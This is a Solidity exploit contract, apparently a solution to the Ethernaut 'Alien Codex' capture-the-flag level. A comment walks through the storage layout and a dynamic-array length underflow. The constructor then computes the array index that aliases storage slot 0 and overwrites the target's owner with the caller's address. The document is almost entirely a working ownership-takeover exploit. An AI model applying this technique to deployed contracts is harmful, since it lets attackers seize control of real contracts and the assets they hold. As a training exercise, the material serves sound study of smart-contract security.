//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IAlienCodex {
    function owner() external view returns(address);
    function makeContact() external ;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract AlienCodexPwn {

    /* 
    STORAGE LAYOUT
    Slot 0 - owner(20 bytes) , contact (bool -1 byte)
    Slot 1 - length of the dynamic array 'codex'

    array elements are stored in the following pattern
    codex[0] - keccak256(arrays slot that stores its length- slot 1 in this case)
    so

    lets say h is the storage slot of codex[0]
    h = keccak256(1)
    slot h = codex[0]
    slot h + 1 = codex[1]
    slot h + 2 = codex[2]
    --
    --
    -- 
    slot h + (2 **256 - 1) = codex[2**256  - 1]   // when executing retract when the length of codex is 0 - 


    the codex array underflows and Occupies all the storage slots of the contract -- INCLUDING SLOT 0 & SLOT 1
    So we now just have to change the value of the --- codex [index] that occupies slot 0 -- to our address

    find i such that 

    slot h+i = slot 0; 
    h + i = 0 ; 
    i = 0 - h; 
    
    
    */




    constructor(IAlienCodex codexContract) {
        codexContract.makeContact();
        codexContract.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1)))); // index of codex[0]
        uint256 i;                    // slot that overwrites slot 0  

        //using unchecked{} to disable default underflow/overflow checking which is part of solidity 0.8.0
        unchecked {
            i = 0 - h;
        }

        codexContract.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(codexContract.owner() == msg.sender, "Pwn Failed");
    }


}